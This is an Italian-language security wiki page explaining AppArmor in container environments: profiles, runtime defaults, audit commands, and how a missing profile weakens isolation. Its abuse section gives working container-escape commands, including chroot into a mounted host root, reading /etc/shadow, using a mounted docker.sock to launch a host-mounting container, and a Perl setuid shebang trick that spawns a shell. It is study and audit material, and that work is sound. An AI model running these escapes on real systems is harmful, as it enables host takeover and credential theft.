# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Panoramica

AppArmor è un sistema di **Mandatory Access Control** che applica restrizioni tramite profili specifici per programma. A differenza dei controlli DAC tradizionali, che dipendono in larga misura dalla proprietà di utenti e gruppi, AppArmor consente al kernel di applicare una policy associata al processo stesso. Negli ambienti container, questo è importante perché un workload potrebbe avere privilegi tradizionali sufficienti per tentare un'azione e vedersela comunque negare perché il suo profilo AppArmor non consente il percorso, il mount, il comportamento di rete o l'uso delle capability in questione.

Il concetto più importante da tenere a mente è che AppArmor è **basato sui percorsi**. Gestisce l'accesso al filesystem tramite regole sui percorsi, anziché tramite etichette come fa SELinux. Questo lo rende accessibile e potente, ma significa anche che bind mount e layout alternativi dei percorsi richiedono particolare attenzione. Se lo stesso contenuto dell'host diventa accessibile tramite un percorso diverso, l'effetto della policy potrebbe non essere quello inizialmente previsto dall'operatore.

## Ruolo nell'isolamento dei container

Le verifiche di sicurezza dei container spesso si limitano a capabilities e seccomp, ma AppArmor continua a essere importante anche dopo quei controlli. Immagina un container con più privilegi del dovuto o un workload che, per ragioni operative, necessitava di una capability aggiuntiva. AppArmor può comunque limitare l'accesso ai file, il comportamento dei mount, il networking e le modalità di esecuzione, bloccando i percorsi di abuso più ovvi. Per questo disabilitare AppArmor «solo per far funzionare l'applicazione» può trasformare silenziosamente una configurazione semplicemente rischiosa in una attivamente sfruttabile.

## Laboratorio

Per verificare se AppArmor è attivo sull'host, usa:

```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```

Per vedere con quale utente è in esecuzione il processo attuale del container:

```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```

La differenza è istruttiva. Nel caso normale, il processo dovrebbe mostrare un contesto AppArmor associato al profilo scelto dal runtime. Nel caso non confinato, questo ulteriore livello di restrizione scompare.

Puoi anche verificare cosa Docker ritiene di aver applicato:

```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```

## Utilizzo a runtime

Docker può applicare un profilo AppArmor predefinito o personalizzato quando l'host lo supporta. Podman può integrarsi con AppArmor anche sui sistemi basati su AppArmor, sebbene nelle distribuzioni in cui SELinux è prioritario spesso sia l'altro sistema MAC a ricoprire il ruolo principale. Kubernetes può esporre policy AppArmor a livello di workload sui nodi che supportano effettivamente AppArmor. Anche LXC e i relativi ambienti Ubuntu per container di sistema fanno ampio uso di AppArmor.

Il punto pratico è che AppArmor non è una "funzionalità di Docker". È una funzionalità del kernel dell'host che diversi runtime possono scegliere di applicare. Se l'host non lo supporta o al runtime viene chiesto di eseguire il container in modalità non confinata, la protezione presunta in realtà non c'è.

Per Kubernetes, in particolare, l'API moderna è `securityContext.appArmorProfile`. Da Kubernetes `v1.30`, le vecchie annotazioni beta di AppArmor sono deprecate. Sugli host supportati, `RuntimeDefault` è il profilo predefinito, mentre `Localhost` fa riferimento a un profilo che deve essere già caricato sul nodo. Questo è importante durante la revisione, perché un manifest può sembrare compatibile con AppArmor pur dipendendo interamente dal supporto del nodo e dai profili precaricati.<sup>[[1]](#references)</sup>

Un dettaglio operativo sottile ma utile è che impostare esplicitamente `appArmorProfile.type: RuntimeDefault` è più rigoroso che omettere semplicemente il campo. Se il campo è impostato esplicitamente e il nodo non supporta AppArmor, l'ammissione dovrebbe fallire. Se il campo viene omesso, il workload può comunque essere eseguito su un nodo senza AppArmor, semplicemente senza ricevere questo ulteriore livello di confinamento. Dal punto di vista di un attaccante, questo è un buon motivo per controllare sia il manifest sia lo stato effettivo del nodo.<sup>[[1]](#references)</sup>

Sugli host compatibili con Docker e AppArmor, il profilo predefinito più noto è `docker-default`. Questo profilo viene generato dal template AppArmor di Moby ed è importante perché spiega perché alcuni PoC basati sulle capability continuano a non funzionare in un container predefinito. In linea generale, `docker-default` consente il normale networking, nega le scritture in gran parte di `/proc`, nega l'accesso a parti sensibili di `/sys`, blocca le operazioni di mount e limita ptrace, impedendone l'uso come strumento generico per sondare l'host. Comprendere questa configurazione di base aiuta a distinguere tra "il container ha `CAP_SYS_ADMIN`" e "il container può effettivamente usare questa capability contro le interfacce del kernel che mi interessano".

## Gestione dei profili

I profili AppArmor sono solitamente archiviati in `/etc/apparmor.d/`. Una convenzione comune consiste nel sostituire le barre nei percorsi degli eseguibili con dei punti. Per esempio, un profilo per `/usr/bin/man` viene comunemente archiviato come `/etc/apparmor.d/usr.bin.man`. Questo dettaglio è importante sia durante la difesa sia durante la valutazione, perché una volta noto il nome del profilo attivo, spesso è possibile individuare rapidamente il file corrispondente sull'host.

Tra i comandi utili per la gestione lato host ci sono:

```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```

Il motivo per cui questi comandi sono importanti in una guida sulla sicurezza dei container è che spiegano come i profili vengono effettivamente creati, caricati, impostati in modalità complain e modificati dopo gli aggiornamenti delle applicazioni. Se un operatore è solito impostare i profili in modalità complain durante la risoluzione dei problemi e poi dimentica di ripristinare l’applicazione delle regole, il container può sembrare protetto nella documentazione, pur comportandosi nella realtà in modo molto meno restrittivo.

### Creazione e aggiornamento dei profili

`aa-genprof` può osservare il comportamento delle applicazioni e aiutare a generare un profilo in modo interattivo:

```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```

`aa-easyprof` può generare un profilo modello che può essere caricato in seguito con `apparmor_parser`:

```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```

Quando il binario cambia e la policy deve essere aggiornata, `aa-logprof` può riprodurre gli eventi di negazione rilevati nei log e aiutare l'operatore a decidere se consentirli o negarli:

```bash
sudo aa-logprof
```

### Log

I rifiuti di AppArmor sono spesso visibili tramite `auditd`, syslog o strumenti come `aa-notify`:

```bash
sudo aa-notify -s 1 -v
```

Questo è utile dal punto di vista operativo e offensivo. I defender lo usano per perfezionare i profili. Gli attacker lo usano per capire quale percorso o operazione specifici vengono negati e se AppArmor è il controllo che blocca una exploit chain.

### Identificare il file del profilo esatto

Quando un runtime mostra il nome di un profilo AppArmor specifico per un container, spesso è utile ricondurre quel nome al file del profilo su disco:

```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```

Questo è particolarmente utile durante la verifica lato host, perché colma il divario tra «il container dichiara di essere in esecuzione con il profilo `lowpriv`» e «le regole effettive si trovano in questo specifico file, che può essere sottoposto ad audit o ricaricato».

### Regole ad alto impatto da verificare

Quando puoi leggere un profilo, non fermarti alle semplici righe `deny`. Diversi tipi di regole modificano in modo sostanziale l'efficacia di AppArmor contro un tentativo di container escape:<sup>[[2]](#references)</sup>

- `ux` / `Ux`: esegue il binario di destinazione senza confinamento. Se un helper, una shell o un interprete raggiungibile è consentito con `ux`, di solito è la prima cosa da testare.
- `px` / `Px` e `cx` / `Cx`: eseguono transizioni di profilo al momento di exec. Non sono automaticamente un problema, ma vale la pena verificarle perché una transizione potrebbe portare a un profilo molto più permissivo di quello attuale.
- `change_profile`: consente a un task di passare a un altro profilo caricato, immediatamente o al prossimo exec. Se il profilo di destinazione è più debole, questo può diventare la via di escape prevista da un dominio restrittivo.
- `flags=(complain)`, `flags=(unconfined)` o il più recente `flags=(prompt)`: queste opzioni dovrebbero influire sul livello di fiducia da riporre nel profilo. `complain` registra le violazioni invece di applicare i divieti, `unconfined` rimuove il confine di sicurezza e `prompt` dipende da una decisione in userspace anziché da un divieto applicato esclusivamente dal kernel.
- `userns` o `userns create,`: le policy AppArmor più recenti possono controllare la creazione di user namespace. Se un profilo del container lo consente esplicitamente, i namespace utente annidati restano utilizzabili anche quando la piattaforma impiega AppArmor come parte della propria strategia di hardening.

Comando grep utile lato host:

```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Questo tipo di audit è spesso più utile che esaminare centinaia di regole ordinarie sui file. Se un breakout dipende dall'esecuzione di un helper, dall'ingresso in un nuovo namespace o dall'evasione verso un profilo meno restrittivo, la risposta è spesso nascosta in queste regole orientate alle transizioni, piuttosto che nelle ovvie righe del tipo `deny /etc/shadow r`.

## Configurazioni errate

L'errore più ovvio è `apparmor=unconfined`. Gli amministratori spesso lo impostano durante il debug di un'applicazione che non funzionava perché il profilo aveva correttamente bloccato qualcosa di pericoloso o imprevisto. Se il flag rimane in produzione, l'intero livello MAC è di fatto rimosso.

Un altro problema più sottile è presumere che i bind mount siano innocui perché i permessi dei file sembrano normali. Poiché AppArmor si basa sui percorsi, esporre percorsi dell'host sotto posizioni di mount alternative può interagire negativamente con le regole sui percorsi. Un terzo errore è dimenticare che il nome di un profilo in un file di configurazione conta ben poco se il kernel dell'host non applica effettivamente AppArmor.

## Abuso

Quando AppArmor non è attivo, operazioni precedentemente limitate potrebbero improvvisamente funzionare: leggere percorsi sensibili tramite bind mount, accedere a parti di procfs o sysfs che avrebbero dovuto essere più difficili da usare, eseguire operazioni relative ai mount se anche le capability/seccomp lo consentono oppure usare percorsi che un profilo normalmente negherebbe. Spesso AppArmor spiega perché un tentativo di breakout basato sulle capability, che sulla carta "dovrebbe funzionare", nella pratica fallisce comunque. Rimuovi AppArmor e lo stesso tentativo potrebbe iniziare a riuscire.

Se sospetti che AppArmor sia il principale ostacolo a una catena di abuso basata su path-traversal, bind mount o mount, il primo passo di solito consiste nel confrontare ciò che diventa accessibile con e senza un profilo. Ad esempio, se un percorso dell'host è montato all'interno del container, inizia verificando se puoi raggiungerlo e leggerlo:

```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```

Se il container dispone anche di una capability pericolosa come `CAP_SYS_ADMIN`, uno dei test più pratici consiste nel verificare se AppArmor è il controllo che blocca le operazioni di mount o l'accesso ai filesystem sensibili del kernel:

```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```

Negli ambienti in cui un percorso dell'host è già disponibile tramite un bind mount, la perdita di AppArmor può anche trasformare un problema di divulgazione di informazioni in sola lettura in un accesso diretto ai file dell'host:

```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```

Lo scopo di questi comandi non è dimostrare che AppArmor, da solo, provochi la fuga dal container. Il punto è che, una volta rimosso AppArmor, diventa subito possibile testare molti percorsi di abuso basati su filesystem e mount.

### Esempio completo: AppArmor disabilitato + root dell'host montata

Se il root dell'host è già montato nel container tramite bind mount in `/host`, rimuovere AppArmor può trasformare un percorso di abuso del filesystem bloccato in una completa fuga dall'host:

```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```

Una volta che la shell viene eseguita tramite il filesystem host, il workload è di fatto uscito dai confini del container:

```bash
id
hostname
cat /etc/shadow | head
```

### Esempio completo: AppArmor disabilitato + socket runtime

Se la vera barriera era AppArmor attorno allo stato del runtime, un socket montato può bastare per un escape completo:

```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```

Il percorso esatto dipende dal punto di mount, ma il risultato finale è lo stesso: AppArmor non impedisce più l’accesso alla runtime API, che può avviare un container in grado di compromettere l’host.

### Esempio completo: bypass tramite bind mount basato sul percorso

Poiché AppArmor si basa sui percorsi, proteggere `/proc/**` non protegge automaticamente gli stessi contenuti di procfs dell’host quando sono raggiungibili tramite un percorso diverso:

```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```

L'impatto dipende da cosa viene montato esattamente e dal fatto che il percorso alternativo aggiri anche altri controlli, ma questo schema è uno dei motivi più evidenti per cui AppArmor va valutato insieme alla configurazione dei mount, anziché isolatamente.

### Esempio completo: Shebang Bypass

AppArmor può associare un profilo al percorso dello script eseguito, anziché all'interprete indicato dallo shebang. Al contrario, invocando direttamente l'interprete si può selezionare il profilo dell'interprete. Un [manutentore di AppArmor descrive questa distinzione](https://bugs.launchpad.net/apparmor/+bug/1911431). Un esempio storico riguardava uno script la cui prima riga puntava a un interprete confinato:

```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```

L'esempio è solo un caso possibile in cui la capability sui file dell'interprete può diventare effettiva e l'effettivo attachment exec dello script consente l'operazione. Controlla la policy caricata e l'etichetta del processo, il capability bounding set, `no_new_privs` e lo stato `nosuid` del mount; il solo nome di un file di profilo o la voce `cap_setuid+ep` non dimostrano che la transizione sia utilizzabile. Le catene di interpreti e i percorsi di esecuzione alternativi meritano verifiche separate.

## Verifiche

Lo scopo di queste verifiche è rispondere rapidamente a tre domande: AppArmor è abilitato sull'host? Il processo corrente è confinato? Il runtime ha effettivamente applicato un profilo a questo container?

```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Cosa è interessante qui:

- Se `/proc/self/attr/current` mostra `unconfined`, il carico di lavoro non beneficia dell'isolamento di AppArmor.
- Se `aa-status` mostra AppArmor disabilitato o non caricato, qualsiasi nome di profilo nella configurazione del runtime è perlopiù cosmetico.
- Se `docker inspect` mostra `unconfined` o un profilo personalizzato inatteso, spesso è questo il motivo per cui funziona un percorso di abuso basato sul file system o sui mount.
- Se `/sys/kernel/security/apparmor/profiles` non contiene il profilo previsto, la configurazione del runtime o dell'orchestratore non è sufficiente da sola.
- Se un profilo che dovrebbe essere hardened contiene regole `ux`, `change_profile` permissive, `userns` o del tipo `flags=(complain)`, il confine di sicurezza pratico potrebbe essere molto più debole di quanto suggerisca il nome del profilo.

Se un container ha già privilegi elevati per motivi operativi, mantenere AppArmor abilitato fa spesso la differenza tra un'eccezione controllata e un problema di sicurezza molto più ampio.

## Impostazioni predefinite dei runtime

| Runtime / piattaforma | Stato predefinito | Comportamento predefinito | Indebolimenti manuali comuni |
| --- | --- | --- | --- |
| Docker Engine | Abilitato per impostazione predefinita sugli host compatibili con AppArmor | Usa il profilo AppArmor `docker-default`, a meno che non venga sovrascritto | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Dipende dall'host | AppArmor è supportato tramite `--security-opt`, ma l'impostazione predefinita esatta dipende dall'host e dal runtime ed è meno universale del profilo `docker-default` documentato da Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Abilitazione condizionale | Se `appArmorProfile.type` non è specificato, l'impostazione predefinita è `RuntimeDefault`, ma viene applicata solo quando AppArmor è abilitato sul nodo | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` con un profilo debole, nodi senza supporto per AppArmor |
| containerd / CRI-O con Kubernetes | Dipende dal supporto del nodo e del runtime | I runtime comunemente supportati da Kubernetes supportano AppArmor, ma l'applicazione effettiva dipende comunque dal supporto del nodo e dalle impostazioni del workload | Come nella riga di Kubernetes; anche la configurazione diretta del runtime può escludere completamente AppArmor |

Per AppArmor, la variabile più importante spesso è **l'host**, non solo il runtime. Un'impostazione del profilo in un manifest non crea isolamento su un nodo in cui AppArmor non è abilitato.

## References

- [1] [Contesto di sicurezza Kubernetes: campi del profilo AppArmor e comportamento del supporto dei nodi](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Pagina man di `apparmor.d(5)` di Ubuntu 24.04: transizioni exec, `change_profile`, `userns` e flag dei profili](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
